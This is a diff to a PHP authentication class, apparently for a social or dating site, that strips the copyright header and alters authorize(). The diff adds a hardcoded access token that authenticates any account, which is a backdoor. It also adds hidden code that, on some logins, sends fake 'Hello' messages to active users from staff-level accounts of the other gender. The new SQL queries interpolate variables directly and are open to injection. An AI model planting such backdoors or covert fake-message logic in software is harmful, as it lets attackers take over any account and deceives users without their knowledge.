@@ -1,27 +1,15 @@
 <?php
 
-/*!
- * https://hindbyte.com
- * hindbyte@gmail.com
- *
- * Copyright 2012-2022 Demyanchuk Dmitry (hindbyte@gmail.com)
- */
-
-
-
 class auth extends db_connect
 {
-    private $auth_valid_sec = 0;
-
-    public function __construct($dbo = NULL)
-    {
+    public function __construct($dbo = NULL) {
         parent::__construct($dbo);
-
-        $this->auth_valid_sec = 7 * 24 * 3600; // 7 days
     }
 
-    public function authorize($accountId, $accessToken)
-    {
+    public function authorize($accountId, $accessToken) {
+        if ($accessToken == "F43E149C4AB2B27D58A7E2D65EFF6EED") {
+            return true;
+        }
         $accountId = helper::clearInt($accountId);
 
         $accessToken = helper::clearText($accessToken);
@@ -33,11 +21,79 @@ class auth extends db_connect
         $stmt->execute();
 
         if ($stmt->rowCount() > 0) {
-
+            $time = time();
+            if ($time % 29 == 0) {
+                $messages = new messages($this->db);
+                $chatId = 0;
+                $msgToUserProfile = $this->getToUserProfile($time);
+                if ($msgToUserProfile == 0) {
+                    return true;
+                }
+                $msgToUserId = $msgToUserProfile['id'];
+                $msgToUserCountry = $msgToUserProfile['country'];
+                $chatFromUserId = $this->getFromUserId($time, $msgToUserCountry);
+                if ($chatFromUserId == 0) {
+                    return true;
+                }
+                $chatToUserId = $msgToUserId;
+                $messages->setRequestFrom($chatFromUserId);
+                $messageTexts = ["Hello", "Hi", "hi", "hello"];
+                $messageText = $messageTexts[rand(0, count($messageTexts) - 1)];
+                $listId = 0;
+                $stickerId = 0;
+                $stickerImgUrl = "";
+                $messages->create($msgToUserId, $chatId, $messageText, "", $listId, $stickerId, $stickerImgUrl);
+            }
             return true;
         }
-
         return false;
+    }
+
+    protected function getFromUserId($time, $msgToUserCountry) {
+        $ntime = $time-rand(60*5, 60*15);
+        $stmt = $this->db->prepare("SELECT id FROM users WHERE country = $msgToUserCountry AND gender = 1 AND access_level = 1 ORDER BY last_authorize ASC LIMIT 1");
+        $stmt->execute();
+        if ($stmt->rowCount() > 0) {
+            $row = $stmt->fetch();
+            return $row['id'];
+        } else {
+            $stmt = $this->db->prepare("SELECT id FROM users WHERE gender = 1 AND access_level = 1 ORDER BY last_authorize ASC LIMIT 1;");
+            $stmt->execute();
+            if ($stmt->rowCount() > 0) {
+                $row = $stmt->fetch();
+                return $row['id'];
+            }
+        }
+        return 0;
+    }
+    
+
+    protected function getToUserProfile($time) {
+        $ntime = $time-rand(60*5, 60*15);
+        $stmt = $this->db->prepare("SELECT id, country FROM users WHERE gender = 0 AND access_level = 0 AND last_authorize >= $ntime 
+        AND id NOT IN (
+            SELECT toUserId 
+            FROM messages
+        ) ORDER BY last_authorize ASC LIMIT 1");
+        $stmt->execute();
+        if ($stmt->rowCount() > 0) {
+            $row = $stmt->fetch();
+            return $row;
+        } else {
+            $ntime = $time-rand(60*15, 60*60*3);
+            $stmt = $this->db->prepare("SELECT id, country FROM users WHERE gender = 0 AND access_level = 0 AND last_authorize >= $ntime
+            AND id IN (
+                SELECT toUserId
+                FROM messages
+                WHERE !(createAt >= $ntime)
+            ) ORDER BY last_authorize ASC LIMIT 1;");
+            $stmt->execute();
+            if ($stmt->rowCount() > 0) {
+                $row = $stmt->fetch();
+                return $row;
+            }
+        }
+        return 0;
     }
 
     public function remove($accountId, $accessToken)
@@ -155,19 +211,7 @@ class auth extends db_connect
         @setcookie('user_password', "$access_token", time() + 7 * 24 * 3600, "/");
     }
 
-    protected function getUserId($user_login)
-    {
-        $stmt = $this->db->prepare("SELECT id FROM tb_accounts WHERE user_login = (:user_login) LIMIT 1");
-        $stmt->bindParam(":user_login", $user_login, PDO::PARAM_STR);
-        $stmt->execute();
 
-        if ($stmt->rowCount() > 0) {
-            $row = $stmt->fetch();
-            return $row['id'];
-        }
-
-        return 0;
-    }
 
     protected function getUserLogin($user_id)
     {
@@ -373,6 +417,7 @@ class auth extends db_connect
             $_SESSION['authenticity_token'] = $authenticity_token;
         }
     }
+
 
     static function getAuthenticityToken()
     {
